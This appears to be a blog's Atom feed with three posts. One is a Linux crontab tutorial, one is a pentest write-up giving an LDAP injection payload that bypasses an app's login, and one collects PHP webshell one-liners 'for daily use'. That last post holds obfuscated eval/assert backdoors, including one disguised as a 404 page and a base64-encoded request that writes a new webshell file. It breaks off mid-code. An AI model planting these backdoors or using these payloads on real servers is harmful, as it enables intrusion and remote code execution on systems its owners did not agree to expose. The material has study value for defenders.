    <link href="http://airs-sec.com/2017/10/09/linux%E5%91%A8%E6%9C%9F%E6%80%A7%E8%BF%9B%E7%A8%8B%EF%BC%88%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%EF%BC%89/"/>
    <id>http://airs-sec.com/2017/10/09/linux周期性进程（任务计划）/</id>
    <published>2017-10-09T02:01:07.000Z</published>
    <updated>2017-10-09T06:43:05.970Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>任务计划(也叫做周期性任务)：在未来的某个时间点，通过crontab执行某个(命令)或一系列任务（shell脚本）。执行结果会以邮件的形式发送给管理员。</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1507530487918.jpg" alt="crontab"></p><a id="more"></a><h1 id="crontab的安装"><a href="#crontab的安装" class="headerlink" title="crontab的安装"></a>crontab的安装</h1><p>在redhat中默认是安装了的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@xc ~]# rpm -qa | grep cron</span><br><span class="line">vixie-cron-4.1-81.el5</span><br><span class="line">crontabs-1.10-8</span><br><span class="line">anacron-2.3-45.el5</span><br></pre></td></tr></table></figure><p>要使用 crond 服务，你必须安装了<code>vixie-cron</code> RPM 软件包，而且必须在运行 crond 服务。要判定该软件包是否已安装，使用 <code>rpm -q vixie-cron</code>命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@xc ~]# which crontab</span><br><span class="line">/usr/bin/crontab</span><br></pre></td></tr></table></figure><p>如果没有安装，可以用如下方式安装：</p><p>1.插入光盘，用rpm安装<br>    <code>rpm -ivh cron*</code><br>2.使用yum命令<br>    <code>yum install -y crontab</code></p><p>crontab的配置文件,可编辑配置文件，来达到自己的目的<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@xc ~]# vim /etc/crontab </span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line">HOME=/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> run-parts</span></span><br><span class="line">01 * * * * root run-parts /etc/cron.hourly</span><br><span class="line">02 4 * * * root run-parts /etc/cron.daily</span><br><span class="line">22 4 * * 0 root run-parts /etc/cron.weekly</span><br><span class="line">42 4 1 * * root run-parts /etc/cron.monthly</span><br></pre></td></tr></table></figure></p><p>修改完后，需要重新启动crond服务</p><p><code>service crond restart</code>或者<code>/etc/init.d/crond restart</code></p><p><strong><font color="red" font-size="16px">注意：在进行周期性和一次性任务编写的时候，要注意系统时间是否和当前的时间是否匹配的问题。</font></strong></p><h1 id="at"><a href="#at" class="headerlink" title="at"></a>at</h1><blockquote><p>在说crontab之前，我们先来说下另一个命令 <strong><font color="red" font-size="16px">at</font></strong>,  <strong><font color="red" font-size="16px">at</font></strong> 命令是安排一次性任务的命令，执行完之后就会自动移除</p></blockquote><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1507515219734.jpg" alt="at"></p><p>at后面接一个时间点，书写完命令后，ctrl+d组合键提交任务，通过邮件查看。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1507515267803.jpg" alt="邮件"></p><p>邮件内容会提示你执行命令的结果。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1507515298576.jpg" alt="at结果"></p><p><code>at -l：查看当前系统额一次性任务列表</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1507515361697.jpg" alt="at -l"></p><p><code>at -d 任务标号：删除指定的一次性任务</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1507515409645.jpg" alt="at -d"></p><p><code>at -f file 时间：通过从文件中读取命令，进行任务安排</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@xc ~]# cat file.txt </span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">[root@xc ~]# at -f file.txt 10:24</span><br><span class="line">job 6 at 2015-08-23 10:24</span><br></pre></td></tr></table></figure><blockquote><p>at在做一次性任务的时候还是比较有效果的，当在工作时，想临时离开下岗位，而接下来又要进行某个操作，可以使用at命令来执行这个操作。</p></blockquote><blockquote><p>言归正传</p></blockquote><h1 id="crond服务的相关文件"><a href="#crond服务的相关文件" class="headerlink" title="crond服务的相关文件"></a>crond服务的相关文件</h1><p>当<code>crond</code>服务启动的时候，他会读取配置文件，把它们保存在内存中，然后，转入睡眠状态。每一分钟，<code>crond</code>会醒来一次，检查<code>crontab</code>文件的修改时间。重新载入任何被改过的文件，然后在返回睡眠状态，执行这一分钟安排的任务。</p><blockquote><p>配置文件：<code>crontab</code>，是<code>cron table</code>的缩写</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@xc ~]# cat /etc/crontab </span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash #指定系统要使用哪个shell</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin#指定系统执行命令的路径</span><br><span class="line">MAILTO=root#指定了邮件发送谁，为空，则不发送。</span><br><span class="line">HOME=/#指定了在执行命令或脚本的主目录</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> run-parts</span></span><br><span class="line">01 * * * * root run-parts /etc/cron.hourly</span><br><span class="line">02 4 * * * root run-parts /etc/cron.daily</span><br><span class="line">22 4 * * 0 root run-parts /etc/cron.weekly</span><br><span class="line">42 4 1 * * root run-parts /etc/cron.monthly</span><br></pre></td></tr></table></figure><p><code>cron</code>在三个地方查找文件，<code>/var/spool/cron,/etc/cron.d,/etc/crontab</code>，每个普通用户的<code>crontab</code>文件都存放在<code>/var/spool/cron</code>目录下，一个用户对应一个文件。而系统用户的则放在<code>/etc/cron.d</code>或<code>/etc/crontab</code>下。</p><ul><li><p>系统的cron任务<br>  在/etc/cron,/etc/cron.d下配置，这是有系统管理员分配的，这两个目录时平行的关系。</p></li><li><p>其他普通用户的任务<br>  会在/var/spool/cron下生成该普通用户的用户名对应的一个以用户名命名的文件。</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><blockquote><p>用/etc/cron.allow和/etc/cron.deny这两个配置文件可以指定哪些用户可以提交crontab文件。</p><p>如果 cron.allow 文件存在，只有其中列出的用户才被允许使用 cron，并且 cron.deny 文件会被忽略。<br>如果 cron.allow 文件不存在，所有在 cron.deny 中列出的用户都被禁止使用 cron。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/cron*</span><br><span class="line">cron.hourly/  cron.weekly/   cron.daily/   cron.monthly/</span><br></pre></td></tr></table></figure><blockquote><p>这四个目录下有相应的程序，它们会在相应的时间运行(有后缀名可知)，这是系统自己的周期性任务</p></blockquote><h1 id="crontab语法"><a href="#crontab语法" class="headerlink" title="crontab语法"></a>crontab语法</h1><p><strong><font color="red" font-size="16px">crontab是crond的管理工具，可以用crontab来配置计划任务。crond和crontab的关系，crond相当于进程，crontab是管理工具</font></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crontab [-u user] file</span><br><span class="line">crontab [-u user] [-l | -r | -e] [-i] [-s]</span><br><span class="line"></span><br><span class="line">-u:指定执行当前操作的用户</span><br><span class="line">-l:列出当前的crontab用户</span><br><span class="line">-r:移除所有任务</span><br><span class="line">-e:编辑某个任务（以当前用户的身份），也可用于新建任务，敲入回车后，会弹出一个文本编辑器的界面，里面输入指令，写完后，保存</span><br><span class="line">-i：在删除用户的crontab文件时给确认提示。</span><br><span class="line">file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。</span><br></pre></td></tr></table></figure><p><strong><font color="red" font-size="16px">crontab的所有操作都是对当前用户而言</font></strong></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>1.编写计划任务<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@xc cron]#crontab -e</span><br><span class="line">35 10 * * * cat /etc/group</span><br></pre></td></tr></table></figure></p><p>2.查看计划任务<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@xc cron]# crontab -l</span><br><span class="line">35 10 * * * cat /etc/group</span><br></pre></td></tr></table></figure></p><p>3.邮件查看<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail</span><br></pre></td></tr></table></figure></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1507520187915.jpg" alt="mail"></p><h1 id="crontab文件的格式"><a href="#crontab文件的格式" class="headerlink" title="crontab文件的格式"></a>crontab文件的格式</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">minute  hour    day  month  weekday [username] command</span><br><span class="line">分钟    小时     天    月    周     [ 用户 ]    所执行的命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">分钟：1-59</span><br><span class="line">小时：1-23</span><br><span class="line">天：1-31</span><br><span class="line">月：1-12</span><br><span class="line">周：0-6（0为星期天）</span><br><span class="line"></span><br><span class="line">每个和时间相关的字段可以有（时间通配符）：</span><br><span class="line">*:可以代表所有的</span><br><span class="line">- :[1-5]分钟，可以代表一个范围</span><br><span class="line">,：逗号隔开，表示不连续的多个时间点</span><br><span class="line">整数 ：则精确匹配</span><br><span class="line">/#    ：对应的范围内每多久一次，20/2 * * 1,周一的每两个小时，每隔20分钟执行一次</span><br></pre></td></tr></table></figure><blockquote><p>普通用户的在编写任务时，可以不写username<br>系统用户需要指定username</p></blockquote><p>执行的命令可以是指定的程序</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1507530047198.jpg" alt="program"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>1、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">45     10     *     *     1-5</span><br><span class="line">从周一到周五，上午10.45</span><br></pre></td></tr></table></figure></p><p>2、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0,30    *     13     *     5    </span><br><span class="line">weekday和day都指定，满足两个条件中的一个即可。</span><br><span class="line">上面的则代表：星期五的每半个小时，也可以为每月13号的每半个小时</span><br></pre></td></tr></table></figure></p><p>3、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">30     2     *     *     1     (cd /users/joe/project; make)</span><br><span class="line">每周一的凌晨2.30，会在/users/joe/project目录下运行make</span><br></pre></td></tr></table></figure></p><p>4、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">20     1     *     *     *　find /tmp -atime +3 -exec rm -f &#123; &#125; &apos;;&apos;</span><br><span class="line">每天的1.20，删除/tpm目录下，3天没有被访问的文件</span><br></pre></td></tr></table></figure></p><p>5、清理文件系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find / -xdev -type f '(' -name core -o name 'core.[0-9]*' ')' -atime +7 -exec rm -f &#123; &#125; ';'</span><br><span class="line"></span><br><span class="line">删除一个星期中都没有被访问的core映像文件。</span><br><span class="line"></span><br><span class="line">-xdev:确保find命令不会执行到根文件系统以外的文件系统中去。</span><br><span class="line">-type f:linux内核源代码包括一个目录也叫做core，不应该删除它。</span><br></pre></td></tr></table></figure><p>6、删除哪些用#、.#或者.nfs开头的文件或以~以及.CKP结尾且三天没有被访问的文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -xdev -atime + 3 '(' -name '#*' -o -name '.#*' -o -name '*.CKP' -o -name '*~' -o -name '.nfs*' ')' -exec rm -f &#123; &#125; ';'</span><br></pre></td></tr></table></figure></p><p>7、递归删除/tmp下在72小时内没有被修改过的所有子目录<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp; find . ! -name . ! -name lost+found -type d -mtime +3 -exec /bin/rm -rf &#123; &#125;</span><br><span class="line"> ';'</span><br></pre></td></tr></table></figure></p><p>8、利用crontab实现数据库的周期性备份（这个实例<a href="http://gzmaster.blog.51cto.com/299556/62804" target="_blank" rel="noopener">参考</a>）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1、新建一个存放备份数据库的文件夹</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir /mysqlbak</span></span><br><span class="line"></span><br><span class="line">2、创建一个备份数据库的shell脚本</span><br><span class="line"></span><br><span class="line">vim /usr/sbin/mysqlbak.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line">rq=`date +%Y%m%d%H%M%S`</span><br><span class="line"></span><br><span class="line">[ -f /mysqlbak ] || mkdir /mysqlbak &gt;&amp;/dev/null</span><br><span class="line"></span><br><span class="line">tar zcvf /mysqlbak/mysql$rq.tar.gz /var/lib/mysql &gt;&amp;/dev/null</span><br><span class="line"></span><br><span class="line">3、加权限</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> chmod +x /usr/sbin/mysqlbak.sh </span></span><br><span class="line"></span><br><span class="line">4、创建计划任务</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> crontab -e </span></span><br><span class="line"></span><br><span class="line">36 13 * * * root (/bin/bash /usr/sbin/mysqlbak.sh)</span><br><span class="line"></span><br><span class="line">5、重新启动crond</span><br><span class="line">　　</span><br><span class="line"><span class="meta">#</span><span class="bash"> /etc/rc.d/init.d/crond restart</span></span><br><span class="line">　　</span><br><span class="line"></span><br><span class="line">完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">备份数据库还可以使用如下命令</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> mysqldump --all-databases -uroot -p<span class="string">''</span> &gt;/mysqlbak/mysqlbak01.sql</span></span><br></pre></td></tr></table></figure><h1 id="其他的日程安排程序：ANACRON"><a href="#其他的日程安排程序：ANACRON" class="headerlink" title="其他的日程安排程序：ANACRON"></a>其他的日程安排程序：ANACRON</h1><p><strong>anacron：</strong></p><p>cron的补充，弥补了cron应系统当机或机器时间出现不连续的情况而没有执行到相应的命令。</p><h1 id="如何拒收邮件"><a href="#如何拒收邮件" class="headerlink" title="如何拒收邮件"></a>如何拒收邮件</h1><p>每次执行完计划任务，都会以邮件的形式发送给管理员，如果任务过多，日积月累，导致管理员邮箱爆满，所有，我们可以配置在执完任务之后，不发送邮件，或者将执行结果重定向。</p><p>在/etc/crontab中配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">  MAILTO=&apos;&apos;</span><br><span class="line">方法二：在crontab -e的时候配置</span><br><span class="line">0 */3 * * * /usr/local/apache2/apachectl restart &gt;/dev/null</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;任务计划(也叫做周期性任务)：在未来的某个时间点，通过crontab执行某个(命令)或一系列任务（shell脚本）。执行结果会以邮件的形式发送给管理员。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1507530487918.jpg&quot; alt=&quot;crontab&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="http://airs-sec.com/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>App测试之LDAP注入</title>
    <link href="http://airs-sec.com/2017/08/28/App%E6%B5%8B%E8%AF%95%E4%B9%8BLDAP%E6%B3%A8%E5%85%A5/"/>
    <id>http://airs-sec.com/2017/08/28/App测试之LDAP注入/</id>
    <published>2017-08-28T02:26:19.000Z</published>
    <updated>2017-08-28T04:04:36.796Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><code>在对客户的实际环境的测试中，有一套内部办公系统，需要对这套系统进行测试，这套系统主要为一个APP（安卓版），由于是安装在手机上的App,所以需要通过抓包把App的访问通过电脑的抓包软件进行抓包分析。</code></p><p>-App测试也是第一次接触，所以在测试时参考了相关资料-</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p><code>测试App</code> <code>burpsuite</code></p><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p>1.手机上设置代理</p><p>在手机（我这是小米note）的设置选项里，找到wlan的代理选项，填写你在burpsuite中设置的地址和端口（这个地址和端口和burpsuite中设置的需要一样）。</p><p><img src="http://obgutsg63.bkt.clouddn.com/Screenshot_2017-08-28-10-43-00-269_com.android.se.png" alt="手机代理"></p><p>2.电脑上burpsuite中设置代理，并启用代理选项</p><p><img src="http://obgutsg63.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170828114830.png" alt="burpsuite"></p><p><img src="http://obgutsg63.bkt.clouddn.com/%E9%80%92%E5%9B%9B%E6%96%B9%E9%80%9F%E9%80%92.png" alt="burpsuite"></p><p>设置好之后，开始抓包即可。</p><p><code>之后的操作和浏览器抓包一样了</code></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h3><p><code>需要了解LDAP注入的可以看wooyun的这篇文章，</code><a href="http://wooyun.jozxing.cc/static/drops/tips-967.html" target="_blank" rel="noopener">LDAP注入与防御剖析</a>，<code>这篇文章中，详细介绍了LDAP注入的相关知识。</code></p><p>-截取文章中的一段-</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">5.1 AND盲注</span><br><span class="line"></span><br><span class="line">假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：         </span><br><span class="line"></span><br><span class="line">(&amp;(objectClass=printer)(type=Epson*))</span><br><span class="line">使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击</span><br><span class="line"></span><br><span class="line">*)(objectClass=*))(&amp;(objectClass=void</span><br><span class="line">Web应用会构造如下查询：      </span><br><span class="line"></span><br><span class="line">(&amp;(objectClass=*)(objectClass=*))(&amp;(objectClass=void)(type=Epson*))</span><br><span class="line">仅第一个LDAP过滤器会被处理：</span><br><span class="line"></span><br><span class="line">(&amp;(objectClass=*)(objectClass=*))</span><br><span class="line">结果是，打印机的图标一定会显示到客户端，因为这个查询总是会获得结果：过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。</span><br><span class="line"></span><br><span class="line">从这一点来看，使用盲注技术比较容易，例如构造如下的注入：         </span><br><span class="line"></span><br><span class="line">(&amp;(objectClass=*)(objectClass=users))(&amp;(objectClass=foo)(type=Epson*))</span><br><span class="line">(&amp;(objectClass=*)(objectClass=resources))(&amp;(objectClass=foo)(type=Epson*))</span><br><span class="line">这种代码注入的设置允许攻击者推测可能存在于LDAP目录服务中不同对象类的值。当响应Web页面至少包含一个打印机图标时，对象类的值就是存在的，另一方面而言，如果对象类的值不存在或没有对它的访问，就不会有图标出现。</span><br><span class="line"></span><br><span class="line">LDAP盲注技术让攻击者使用基于TRUE/FALSE的技术访问所有的信息。</span><br></pre></td></tr></table></figure><p>这个App存在的就是LDAP AND注入，主要用来绕过访问控制。</p><p><code>将截到的包通过burp进行修改，修改数据提交的用户名字段，改为*)(objectClass%3d*即可绕过访问控制。</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;&lt;code&gt;在对客户的实际环境的测试中，有一套内部办公系统，需要对这套系统进行测试，这套系统主要为一个APP（安卓版），由于
      
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>web后门一句话</title>
    <link href="http://airs-sec.com/2017/07/05/web%E5%90%8E%E9%97%A8%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
    <id>http://airs-sec.com/2017/07/05/web后门一句话/</id>
    <published>2017-07-05T04:53:58.000Z</published>
    <updated>2017-07-05T05:14:14.690Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s/SCk_Q8oG22SaHX3qJ08HeQ" target="_blank" rel="noopener"><img style="position: absolute; top: 0; right: 0; border: 0;" src="http://obgutsg63.bkt.clouddn.com/zhuanzai.png" alt="转载" data-canonical-src="http://obgutsg63.bkt.clouddn.com/zhuanzai.png"></a></p><p><img src="http://obgutsg63.bkt.clouddn.com/37992-106.jpg" alt="enter description here" title="web"></p><p>收集一些一句话，以便日常使用。</p><a id="more"></a><h2 id="三个变形的木马"><a href="#三个变形的木马" class="headerlink" title="三个变形的木马"></a><a href="https://mp.weixin.qq.com/s/SCk_Q8oG22SaHX3qJ08HeQ" target="_blank" rel="noopener">三个变形的木马</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 连接方式：在菜刀里写http://site/1.php?2=assert密码是1</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">$_=<span class="string">""</span>;   </span><br><span class="line">$_[+<span class="string">""</span>]=<span class="string">''</span>;   </span><br><span class="line">$_=<span class="string">"$_"</span>.<span class="string">""</span>;   </span><br><span class="line">$_=($_[+<span class="string">""</span>]|<span class="string">""</span>).($_[+<span class="string">""</span>]|<span class="string">""</span>).($_[+<span class="string">""</span>]^<span class="string">""</span>);   </span><br><span class="line"><span class="meta">?&gt;</span>   </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在菜刀里写http://site/2.php?_=assert&amp;__=eval($_POST['pass']) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">($b4dboy = $_POST[<span class="string">'b4dboy'</span>]) &amp;&amp; @preg_replace(<span class="string">'/ad/e'</span>,<span class="string">'@'</span>.str_rot13(<span class="string">'riny'</span>).<span class="string">'($b4dboy)'</span>, <span class="string">'add'</span>);</span><br><span class="line"><span class="comment"># str_rot13(‘riny’)即编码后的eval，完全避开了关键字！</span></span><br></pre></td></tr></table></figure><h2 id="利用404页面隐藏PHP小马"><a href="#利用404页面隐藏PHP小马" class="headerlink" title="利用404页面隐藏PHP小马"></a>利用404页面隐藏PHP小马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML <span class="keyword">PUBLIC</span> <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;   </span><br><span class="line">&lt;html&gt;&lt;head&gt;   </span><br><span class="line">&lt;title&gt;<span class="number">404</span> Not Found&lt;/title&gt;   </span><br><span class="line">&lt;/head&gt;&lt;body&gt;   </span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;   </span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;   </span><br><span class="line">&lt;/body&gt;&lt;/html&gt;   </span><br><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">@preg_replace(<span class="string">"/[pageerror]/e"</span>,$_POST[<span class="string">'error'</span>],<span class="string">"saft"</span>);   </span><br><span class="line">header(<span class="string">'HTTP/1.1 404 Not Found'</span>);   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="超级隐蔽的PHP后门"><a href="#超级隐蔽的PHP后门" class="headerlink" title="超级隐蔽的PHP后门"></a>超级隐蔽的PHP后门</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_GET[a]($_GET[b]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>仅用GET函数就构成了木马；</strong></p><p><strong>利用方法：</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=assert&amp;b=$&#123;fputs%<span class="number">28</span>fopen%<span class="number">28</span>base64_decode%<span class="number">28</span>Yy5waHA%<span class="number">29</span>,w%<span class="number">29</span>,base64_decode%<span class="number">28</span>PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%<span class="number">29</span>%<span class="number">29</span>&#125;;</span><br></pre></td></tr></table></figure></p><p><code>执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。</code></p><h2 id="层级请求，编码运行PHP后门"><a href="#层级请求，编码运行PHP后门" class="headerlink" title="层级请求，编码运行PHP后门"></a>层级请求，编码运行PHP后门</h2><p><code>此方法用两个文件实现，文件1</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 